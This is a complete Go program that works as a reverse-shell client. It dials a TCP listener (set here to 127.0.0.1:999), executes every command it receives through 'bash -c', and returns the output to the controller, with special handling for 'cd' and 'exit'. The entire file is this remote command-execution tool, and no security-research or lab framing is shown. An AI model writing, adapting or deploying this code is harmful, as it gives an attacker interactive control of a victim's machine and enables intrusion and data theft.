package main

import (
	"bufio"
	"fmt"
	"io"
	"net"
	"os"
	"os/exec"
	"strings"
)

var currentDir string

func main() {
	// Initialize current directory
	currentDir, _ = os.Getwd()

	conn, err := net.Dial("tcp", "127.0.0.1:999")
	if err != nil {
		fmt.Println("Connection error:", err)
		return
	}
	defer conn.Close()

	reader := bufio.NewReader(conn)

	for {
		command, err := reader.ReadString('\n')
		if err != nil {
			fmt.Println("Server disconnected:", err)
			return
		}
		command = strings.TrimSpace(command)
		if command == "" {
			continue
		}
		if command == "exit" {
			return
		}

		// Handle cd command specially
		if strings.HasPrefix(command, "cd ") {
			newDir := strings.TrimSpace(command[3:])
			err := os.Chdir(newDir)
			if err != nil {
				sendOutput(conn, fmt.Sprintf("cd: %v", err))
				continue
			}
			currentDir, _ = os.Getwd()
			sendOutput(conn, currentDir)
			continue
		}

		// Execute other commands
		cmd := exec.Command("bash", "-c", command)
		cmd.Dir = currentDir // Run in the current directory
		stdout, err := cmd.StdoutPipe()
		if err != nil {
			sendOutput(conn, "[error] cannot capture stdout")
			continue
		}
		stderr, _ := cmd.StderrPipe()

		if err := cmd.Start(); err != nil {
			sendOutput(conn, "[error] cannot start command")
			continue
		}

		outBytes, _ := io.ReadAll(stdout)
		errBytes, _ := io.ReadAll(stderr)
		cmd.Wait()

		output := string(outBytes) + string(errBytes)
		output = strings.TrimSpace(output)
		if output == "" {
			output = "[empty]"
		}

		sendOutput(conn, output)
	}
}

func sendOutput(conn net.Conn, output string) {
	// First send the length of the output
	length := len(output)
	fmt.Fprintf(conn, "%d\n", length)

	// Then send the actual output
	conn.Write([]byte(output))
}
